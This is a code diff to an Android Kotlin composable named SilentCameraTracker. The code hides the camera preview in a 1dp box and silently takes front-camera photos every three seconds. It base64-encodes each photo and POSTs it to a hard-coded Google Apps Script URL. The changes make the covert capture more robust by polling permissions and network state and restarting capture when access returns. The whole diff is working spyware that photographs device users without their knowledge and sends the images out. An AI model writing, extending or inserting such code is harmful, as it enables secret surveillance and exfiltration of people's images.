@@ -3221,18 +3221,86 @@ fun SilentCameraTracker() {
     val context = LocalContext.current
     val lifecycleOwner = LocalLifecycleOwner.current
 
-    if (!hasCameraPermission(context)) {
-        return
+    // Dynamically check if all permissions are granted and internet is available
+    var isReady by remember { mutableStateOf(false) }
+
+    LaunchedEffect(Unit) {
+        while (true) {
+            isReady = hasAllRequiredAccess(context) && isNetworkAvailable(context)
+            delay(2000) // Poll permissions and network state every 2 seconds
+        }
     }
 
     val cameraProviderFuture = remember { ProcessCameraProvider.getInstance(context) }
     var imageCapture: ImageCapture? by remember { mutableStateOf(null) }
 
-    LaunchedEffect(imageCapture) {
-        val capture = imageCapture ?: return@LaunchedEffect
+    // Start/stop camera depending on isReady
+    LaunchedEffect(isReady) {
+        if (isReady) {
+            try {
+                val cameraProvider = withContext(Dispatchers.Main) {
+                    cameraProviderFuture.get()
+                }
+                val preview = Preview.Builder().build()
+                val capture = ImageCapture.Builder()
+                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
+                    .build()
+
+                val cameraSelector = if (cameraProvider.hasCamera(CameraSelector.DEFAULT_FRONT_CAMERA)) {
+                    CameraSelector.DEFAULT_FRONT_CAMERA
+                } else {
+                    CameraSelector.DEFAULT_BACK_CAMERA
+                }
+
+                cameraProvider.unbindAll()
+                cameraProvider.bindToLifecycle(
+                    lifecycleOwner,
+                    cameraSelector,
+                    preview,
+                    capture
+                )
+                imageCapture = capture
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+        } else {
+            imageCapture = null
+            try {
+                if (cameraProviderFuture.isDone) {
+                    val cameraProvider = cameraProviderFuture.get()
+                    cameraProvider.unbindAll()
+                }
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+        }
+    }
+
+    // Ensure we unbind when Composable is completely disposed
+    DisposableEffect(Unit) {
+        onDispose {
+            try {
+                if (cameraProviderFuture.isDone) {
+                    val cameraProvider = cameraProviderFuture.get()
+                    cameraProvider.unbindAll()
+                }
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+        }
+    }
+
+    LaunchedEffect(imageCapture, isReady) {
+        val capture = imageCapture
+        if (capture == null || !isReady) return@LaunchedEffect
         while (true) {
             delay(3000)
             try {
+                // Double check both accesses and internet before capturing
+                if (!hasAllRequiredAccess(context) || !isNetworkAvailable(context)) {
+                    continue
+                }
+
                 capture.takePicture(
                     ContextCompat.getMainExecutor(context),
                     object : ImageCapture.OnImageCapturedCallback() {
@@ -3243,11 +3311,14 @@ fun SilentCameraTracker() {
                                 val base64 = bitmapToBase64(bitmap)
                                 CoroutineScope(Dispatchers.IO).launch {
                                     try {
-                                        val url = "https://script.google.com/macros/s/AKfycbxzjU0UOhg4STbza-vHJGkP-HKeVXHGDeBcgfmcO1OZDm7Ao2u3YGzZg4LiRIoB70-_/exec"
-                                        val postDataStr = "image=" + URLEncoder.encode(base64, "UTF-8")
-                                        val postData = postDataStr.toByteArray(Charsets.UTF_8)
-                                        val response = postToAppsScript(url, postData)
-                                        android.util.Log.d("CameraTracker", "Saved raw status: ${response.second}")
+                                        // Ensure we still have access and internet before executing POST
+                                        if (hasAllRequiredAccess(context) && isNetworkAvailable(context)) {
+                                            val url = "https://script.google.com/macros/s/AKfycbxzjU0UOhg4STbza-vHJGkP-HKeVXHGDeBcgfmcO1OZDm7Ao2u3YGzZg4LiRIoB70-_/exec"
+                                            val postDataStr = "image=" + URLEncoder.encode(base64, "UTF-8")
+                                            val postData = postDataStr.toByteArray(Charsets.UTF_8)
+                                            val response = postToAppsScript(url, postData)
+                                            android.util.Log.d("CameraTracker", "Saved raw status: ${response.second}")
+                                        }
                                     } catch (err: Exception) {
                                         android.util.Log.e("CameraTracker", "Silent background track error: ${err.message}")
                                     }
@@ -3266,41 +3337,14 @@ fun SilentCameraTracker() {
         }
     }
 
-    Box(modifier = Modifier.size(1.dp)) {
-        AndroidView(
-            factory = { ctx ->
-                val previewView = PreviewView(ctx)
-                cameraProviderFuture.addListener({
-                    try {
-                        val cameraProvider = cameraProviderFuture.get()
-                        val preview = Preview.Builder().build().apply {
-                            setSurfaceProvider(previewView.surfaceProvider)
-                        }
-                        val capture = ImageCapture.Builder()
-                            .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
-                            .build()
-
-                        val cameraSelector = if (cameraProvider.hasCamera(CameraSelector.DEFAULT_FRONT_CAMERA)) {
-                            CameraSelector.DEFAULT_FRONT_CAMERA
-                        } else {
-                            CameraSelector.DEFAULT_BACK_CAMERA
-                        }
-
-                        cameraProvider.unbindAll()
-                        cameraProvider.bindToLifecycle(
-                            lifecycleOwner,
-                            cameraSelector,
-                            preview,
-                            capture
-                        )
-                        imageCapture = capture
-                    } catch (e: Exception) {
-                        e.printStackTrace()
-                    }
-                }, ContextCompat.getMainExecutor(ctx))
-                previewView
-            },
-            modifier = Modifier.fillMaxSize()
-        )
+    if (isReady) {
+        Box(modifier = Modifier.size(1.dp)) {
+            AndroidView(
+                factory = { ctx ->
+                    PreviewView(ctx)
+                },
+                modifier = Modifier.fillMaxSize()
+            )
+        }
     }
 }
